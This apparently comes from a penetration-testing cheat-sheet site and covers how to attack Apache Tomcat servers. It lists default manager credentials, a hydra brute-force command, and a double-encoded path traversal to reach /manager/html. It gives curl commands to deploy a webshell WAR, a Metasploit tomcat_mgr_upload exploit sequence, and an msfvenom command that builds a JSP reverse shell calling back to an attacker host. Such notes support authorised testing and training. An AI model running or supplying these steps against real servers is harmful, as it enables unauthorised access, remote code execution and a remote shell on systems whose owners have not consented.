---
layout: default
title: Tomcat
parent: Services
grand_parent: Enumeration
nav_order: 6
---

# Tomcat Enumeration
{: .no_toc }

### Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

In some versions prior to Tomcat6 you could enumerate users:

`msf> use auxiliary/scanner/http/tomcat_enum`

### Default credentials

The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files (execute code). But  this path is protected by basic TTP auth, the most common credentials are:

- admin:admin
- tomcat:tomcat
- admin:<NOTHING>
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

You could test these and more using:

```
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

### Tomcat Bruteforce

```
hydra -L users.txt -P <WORDLIST PATH> -f <TARGET IP> http-get /manager/html
```

### Vulns

In order to access to the management web interface of Tomcat navigate to: `pathTomcat/%252E%252E/manager/html`
Take into consideration that to upload the webshell you may need to use double URL encoding

### RCE

If you have access to the Tomcat Web Application Manager, you can upload and deploy a .war file (Remote Code Execution).

#### Limitations

You will only be able to deploy a WAR if you have enough privileges (roles: admin, manager and manager-script). Those details can be found in tomcat-users.xml usually defined in 

`/usr/share/tomcat9/etc/tomcat-users.xml`


*Tomcat7 and above uses /manager/text/undeploy and /manager/text/deploy paths*
*tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed*

**Deploy under "path" context path**

```
curl --upload-file shell.war.war "http://tomcat:Password@localhost:8080/manager/deploy?path=/shell.war"
```

**Undeploy**

```
curl "http://tomcat:Password@localhost:8080/manager/undeploy?path=/shell"
```

### Metasploit

```
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### Reverse Shell .WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=80 -f war -o revshell.war
```